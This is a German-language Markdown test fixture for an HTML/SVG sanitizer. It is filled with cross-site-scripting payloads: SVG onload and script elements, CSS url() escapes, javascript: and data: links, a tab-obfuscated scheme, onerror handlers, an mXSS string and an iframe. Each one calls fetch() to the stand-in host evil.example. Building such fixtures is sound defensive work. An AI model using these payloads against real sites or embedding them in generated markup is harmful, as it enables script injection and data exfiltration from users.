# Malicious-Fixture (RICH-MEDIA)

Jedes gebannte Teil muss fallen, der Rest muss rendern. Alle externen Ziele
zeigen auf `evil.example` — taucht der Host im gerenderten HTML oder als
Request auf, ist etwas durchgekommen.

Text vor der Figur.

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 80" class="hidden" onload="fetch('https://evil.example/onload')" style="background:url(https://evil.example/svg-style.png)">
  <script>fetch('https://evil.example/script')</script>
  <style>rect { fill: url(https://evil.example/style-tag.png) }</style>
  <image href="https://evil.example/image.png" width="10" height="10"/>
  <use href="https://evil.example/use.svg#x"/>
  <foreignObject width="100" height="50"><img src="https://evil.example/fo.png" onerror="fetch('https://evil.example/fo-onerror')"></foreignObject>
  <a href="javascript:fetch('https://evil.example/js-href')"><text x="10" y="70">Link-Label</text></a>
  <animate attributeName="href" to="https://evil.example/animate"/>
  <rect x="10" y="10" width="80" height="40" fill="url(https://evil.example/paint.svg#p)" stroke="#222" style="fill:url(https://evil.example/rect-style.png)"/>
  <rect x="100" y="10" width="80" height="40" fill="\75rl(https://evil.example/css-escape.svg#p)" stroke="#222" onclick="fetch('https://evil.example/onclick')"/>
  <text x="50" y="35" text-anchor="middle">Legitimes Label</text>
</svg>

Text nach der Figur.

<div style="background:url(https://evil.example/div-style.png)">Ein div mit Tracking-Hintergrund.</div>

<div style="background:\75rl(https://evil.example/div-css-escape.png)">Ein div mit CSS-Escape.</div>

<a href="data:text/html,<script>fetch('https://evil.example/data-href')</script>">data-Link als HTML</a>

[data-Link als Markdown](data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22fetch('https%3A%2F%2Fevil.example%2Fmd-data-link')%22%2F%3E)

<a href="da&#9;ta:text/html,<script>fetch('https://evil.example/tab-data-href')</script>">data-Link mit Tab im Schema</a>

<img alt="data-HTML als Bild" src="data:text/html,<script>fetch('https://evil.example/img-data-html')</script>">

<img alt="Bild mit Handler" src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2210%22%20height%3D%2210%22%2F%3E" onerror="fetch('https://evil.example/img-onerror')">

<img alt="<svg viewBox='0 0 1 1'><rect width='1' height='1' fill='x onerror=fetch(`https://evil.example/mxss`) y'/></svg>" src="data:image/png;base64,iVBORw0KGgo=">

<iframe src="https://evil.example/iframe"></iframe>

<script>fetch('https://evil.example/top-script')</script>

Ende des Fixtures.
